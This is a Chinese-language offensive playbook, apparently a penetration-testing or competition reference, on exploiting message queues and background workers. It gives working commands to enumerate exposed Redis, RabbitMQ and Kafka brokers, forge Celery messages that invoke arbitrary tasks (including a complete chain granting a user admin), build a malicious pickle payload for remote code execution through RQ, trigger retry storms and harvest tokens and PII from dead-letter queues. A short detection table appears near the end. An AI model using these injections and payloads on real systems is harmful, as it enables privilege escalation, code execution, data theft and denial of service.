# 队列与 worker 漂移：格式、重试、权限差

> 被 `competition-queue-worker-drift` 引用。队列是**信任边界被打破最多的地方**：API 有严格
> 鉴权，worker 却常以高权限运行，且**信任消息内容**。

## 一、先确定队列是什么

| 队列 | 特征 | 探测 |
| --- | --- | --- |
| **Redis**（LIST/PubSub/Stream） | 6379 端口；`LPUSH`/`BRPOP` | `redis-cli INFO keyspace` 看 key 名 |
| **RabbitMQ** | 5672（AMQP）/15672（管理 UI） | `curl -u guest:guest http://host:15672/api/queues` |
| **Kafka** | 9092；topic 名 | `kafka-topics.sh --bootstrap-server host:9092 --list` |
| **SQS/SNS** | AWS 端点 | 需凭证；看 IAM |
| **Beanstalkd** | 11300 | `echo stats | nc host 11300` |
| **ActiveMQ** | 61616/8161 | 管理 UI |
| **数据库表队列** | 表名 `jobs`/`queue` | `select * from jobs limit 5` |
| **Celery**（Redis/RabbitMQ） | 消息是 base64+JSON 的 pickle 或 json | 见 §3 |
| **Sidekiq**（Redis） | key `queue:default`；值是 JSON | `LRANGE queue:default 0 5` |

```bash
# Redis 队列查看
redis-cli -h 10.0.0.20 KEYS '*' | head -30
redis-cli -h 10.0.0.20 TYPE 'queue:default'
redis-cli -h 10.0.0.20 LRANGE 'queue:default' 0 3
redis-cli -h 10.0.0.20 XRANGE 'stream:jobs' - + COUNT 3

# RabbitMQ
curl -s -u guest:guest http://10.0.0.20:15672/api/queues | jq -r '.[] | "\(.name) \(.messages)"'

# Kafka
kafka-topics.sh --bootstrap-server 10.0.0.20:9092 --list
kafka-console-consumer.sh --bootstrap-server 10.0.0.20:9092 --topic jobs --from-beginning --max-messages 3
```

## 二、四类漂移

### 2.1 消息格式与版本不一致

生产者发 v2 格式，worker 只认 v1 → 要么报错，要么**按 v1 解析出错误的值**。

```bash
# 看实际消息
redis-cli LRANGE 'queue:jobs' 0 2
# 典型 Celery（JSON）
# {"body": "[[\"arg1\"], {}, {\"callbacks\": null, \"errbacks\": null, \"chain\": null, \"chord\": null}]",
#  "headers": {"lang": "py", "task": "app.tasks.send_email", "id": "..."},
#  "content-type": "application/json", "content-encoding": "utf-8", ...}
```

**三种可利用的格式漂移**：

| 漂移 | 做法 | 效果 |
| --- | --- | --- |
| 版本降级 | 把 `"version": 2` 改 `1`，字段布局换成旧格式 | worker 按旧格式解析，可能跳过校验 |
| 字段类型混淆 | `{"user_id": "1001"}` → `{"user_id": 1001}` 或 `{"user_id": ["1001"]}` | 弱类型语言里产生不同分支 |
| 未知字段 | 加 `{"is_admin": true}` | 若 worker 用 `**kwargs` 展开 → 字段注入 |

```bash
# 手工注入一条消息（Celery on Redis 的 LPUSH）
redis-cli -h 10.0.0.20 LPUSH 'queue:celery' '{"body":"[[]]","headers":{"task":"app.tasks.admin_task","id":"x"},"content-type":"application/json","content-encoding":"utf-8","properties":{"delivery_tag":"x","correlation_id":"x","reply_to":"","delivery_mode":2,"priority":0}}'
```

### 2.2 重试导致重复执行

```bash
# 看是否幂等：投一条合法消息两次
redis-cli LPUSH 'queue:jobs' '<合法消息>'
redis-cli LPUSH 'queue:jobs' '<同一消息>'
# 若产生两条记录/两次扣款 → 非幂等
```

**重试放大攻击**：worker 失败会重试，若消息能触发"每次都失败"（如引用不存在的资源），
就形成重试风暴。

| 场景 | 效果 |
| --- | --- |
| 消息引用不存在的 ID | 无限重试 → 队列积压 → 服务不可用 |
| 消息体超大 | 每次重试都重新传输 → 带宽耗尽 |
| 消息触发外部 API | 外部被反复调用（可能触发其限流/封禁） |
| 重试次数无上限 | 永久占用 worker |

```bash
# 观察重试：投一条会失败的消息，看队列深度变化
for i in $(seq 1 5); do
  redis-cli LLEN 'queue:jobs'
  sleep 2
done
# 深度持续不降 → 在重试
```

### 2.3 死信队列泄露

死信（DLQ）里常存**失败消息的完整内容**，包括原始请求中的敏感数据。

```bash
# 找 DLQ
redis-cli KEYS '*dead*' 
redis-cli KEYS '*dlq*'
curl -s -u guest:guest http://10.0.0.20:15672/api/queues | jq -r '.[].name' | grep -iE 'dead|dlq|failed|error'

# 读 DLQ 内容
redis-cli LRANGE 'queue:jobs:dead' 0 5
```

**DLQ 泄露的典型内容**：原始请求 body（含 token）、异常堆栈（含路径/依赖版本）、
用户的 PII（email/手机号/身份证）。

### 2.4 worker 权限高于 API（最有价值）

| 差异 | 后果 |
| --- | --- |
| worker 用 DB 超级用户 | 消息里的 SQL 可直接执行 |
| worker 用 root 跑 | 命令注入直接拿 root |
| worker 不受网关限流 | 高频消息可打垮下游 |
| worker 不做租户隔离 | 消息里的 tenant 可任意指定 |
| worker 信任消息里的 `user_id` | 越权操作用户数据 |

```bash
# 判断 worker 权限：投一条消息让它执行系统命令（授权范围内）
# 若能 RCE，看 whoami 的结果 —— 通常是 root 或高权服务账号
redis-cli LPUSH 'queue:jobs' '{"task":"run_shell","cmd":"id"}'
```

## 三、Celery / RQ / Sidekiq 的具体打法

### 3.1 Celery（Python）

```bash
# Celery 的消息格式（JSON serializer）
python3 - <<'PY'
import json, base64
msg = {
    "body": base64.b64encode(json.dumps([["arg1"], {}, {
        "callbacks": None, "errbacks": None, "chain": None, "chord": None
    }]).encode()).decode(),
    "content-encoding": "utf-8",
    "content-type": "application/json",
    "headers": {
        "lang": "py",
        "task": "app.tasks.send_email",
        "id": "11111111-1111-1111-1111-111111111111",
        "shadow": None,
        "eta": None,
        "expires": None,
        "group": None,
        "retries": 0,
        "timelimit": [None, None],
        "root_id": "11111111-1111-1111-1111-111111111111",
        "parent_id": None,
        "argsrepr": "(['arg1'],)",
        "kwargsrepr": "{}",
        "origin": "gen1@host",
    },
    "properties": {
        "correlation_id": "11111111-1111-1111-1111-111111111111",
        "reply_to": "",
        "delivery_mode": 2,
        "delivery_info": {"exchange": "", "routing_key": "celery"},
        "priority": 0,
        "body_encoding": "base64",
        "delivery_tag": "aaaa"
    }
}
print(json.dumps(msg))
PY > celery_msg.json
```

```bash
# 投递到 Redis（Celery 的默认 broker 用 list，key 是队列名）
redis-cli -h 10.0.0.20 LPUSH celery "$(cat celery_msg.json)"

# 投递到 RabbitMQ
# 用 pika 或 rabbitmqadmin
```

**celery 的关键点**：`headers.task` 决定调用哪个任务。若能改它，就能调**任意已注册任务**。
枚举任务名：从代码里的 `@app.task` 装饰器、`celery inspect registered`（若可达）。

```bash
# 枚举已注册任务（需能连 worker）
celery -A app inspect registered --broker=redis://10.0.0.20:6379/0
celery -A app inspect active --broker=redis://10.0.0.20:6379/0
```

### 3.2 RQ（Python，基于 Redis）

```bash
# RQ 的 job 是 JSON + pickle（data 字段是 pickle！）
redis-cli LRANGE 'rq:queue:default' 0 1
# {"data": "<base64 pickle>", "description": "...", "origin": "...", ...}
```

**RQ 的 pickle 反序列化是直接的 RCE**（若你能写队列）：

```python
# 构造恶意 pickle（授权测试用，仅执行 id）
import pickle, base64, os
class E:
    def __reduce__(self):
        return (os.system, ('id > /tmp/rq_pwned',))
print(base64.b64encode(pickle.dumps(E())).decode())
```

**注意**：这属于"能写队列 = 能 RCE"。要先确认队列是否真的无认证可达。

### 3.3 Sidekiq（Ruby）

```bash
# Sidekiq 的消息是纯 JSON
redis-cli LRANGE 'queue:default' 0 2
# {"class":"HardWorker","args":[1,"x"],"retry":true,"queue":"default","jid":"abc","created_at":...}
```

**关键字段**：`class` 决定调用哪个 Ruby 类。若能改成 `Kernel`/`FileUtils` 之类的类，
可能触发非预期方法。Sidekiq 也有 `ActiveJob` 的封装类。

## 四、从队列注入到 worker 执行（完整链）

```
[1] 拿到队列写权限（无认证 Redis / 弱口令 / 配置泄露）
[2] 读一条合法消息（确定格式与任务名）
[3] 枚举已注册任务（从代码/worker 自省）
[4] 构造消息：改 task / 改 args / 加字段
[5] 投递
[6] 观察效果（日志/DB/出网/回连）
```

```bash
# 完整示例（Celery + Redis，改 task 为高权任务）
python3 - <<'PY' > msg.json
import json, base64
args = json.dumps([{"user_id": 1001, "new_role": "admin"}])
print(json.dumps({
    "body": base64.b64encode(args.encode()).decode(),
    "content-type": "application/json", "content-encoding": "utf-8",
    "headers": {"lang":"py","task":"app.tasks.set_user_role",
                "id":"deadbeef-0000-0000-0000-000000000001","retries":0,
                "root_id":"deadbeef-0000-0000-0000-000000000001"},
    "properties": {"correlation_id":"deadbeef-0000-0000-0000-000000000001",
                   "delivery_mode":2,"delivery_info":{"exchange":"","routing_key":"celery"},
                   "priority":0,"body_encoding":"base64","delivery_tag":"a1"}
}))
PY
redis-cli -h 10.0.0.20 LPUSH celery "$(cat msg.json)"
```

## 五、验伤：队列注入的成功标准

| 结论 | 证据 | 假象 |
| --- | --- | --- |
| 队列无认证 | `LPUSH` 返回整数（队列长度） | `NOAUTH` 错误 |
| 消息被消费 | 队列长度减少 + worker 日志有该 job | 长度减了但进了 DLQ（被拒） |
| 任务被调用 | 任务的实际副作用（DB 变更/邮件发送/命令输出） | 只看到消息被 ack |
| worker 高权 | 命令输出里的 `uid=0(root)` | 任务执行了但权限与 API 同级 |
| 重复执行 | 两次投递产生两条记录 | 只有一条（幂等） |
| DLQ 泄露 | DLQ 里有含 PII/token 的完整消息 | 只有错误摘要 |

**核心判据**：**必须有 worker 侧的副作用**。队列长度变化只证明"消息被取走"，可能被
直接丢弃。

```bash
# worker 日志（若能读到）
docker logs worker 2>&1 | tail -50
journalctl -u celery -n 50 --no-pager
```

## 六、检测视角

| 手法 | 日志/信号 | 特征 |
| --- | --- | --- |
| 队列未授权写 | broker 日志 | 来自非 worker IP 的 `LPUSH`/`PUBLISH` |
| 任务名异常 | worker 日志 | 调用了不在白名单的任务；`task` 字段非常见值 |
| 消息格式异常 | worker 日志 | 反序列化错误；`content-type` 与预期不符 |
| pickle 反序列化 | EDR | worker 进程加载 pickle 后拉起子进程 |
| 重试风暴 | 队列指标 | 单队列深度持续增长；同 job id 重试次数飙升 |
| DLQ 读取 | broker 日志 | 对 `*:dead`/`*dlq*` 的 `LRANGE`/`GET` |
| worker 越权 | 应用审计 | worker 用超管账号执行 DB 操作；命令以 root 运行 |

**关键埋点**：记录消息的 `producer`（生产者的连接 IP/身份）。没有这个字段，无法区分
"合法生产者发的"和"攻击者注入的"。

## 七、常见坑

1. **投了消息但 worker 不消费**——可能队列名错（Celery 的 key 是 `celery` 不是 `queue:celery`）；
   或 worker 只订阅了 exchange/routing_key。
2. **Celery 的 body 要 base64**——且 `body_encoding` 必须是 `base64`。直接放 JSON 字符串会被解析失败。
3. **忘了 `headers.id` 与 `correlation_id` 一致**——不一致可能导致结果回传异常，但任务仍会执行（影响验伤）。
4. **RQ 的 pickle 有版本依赖**——Python 版本不同 pickle 协议不同。用 `protocol=4` 兼容性更好。
5. **重试测试打太多**——重试风暴会真的把服务打挂。投 1-2 条观察即可。
6. **DLQ 只在 RabbitMQ 有**——Redis 类队列的"死信"通常是应用自己实现的另一个 key，要 `KEYS` 找。
7. **worker 权限判断靠猜**——必须让它执行 `id`/`whoami`，不要根据配置文件推断。
8. **消息里的 `eta`/`expires`**——Celery 的 `eta` 会让任务延迟执行，看起来"没生效"。设 `eta: null`。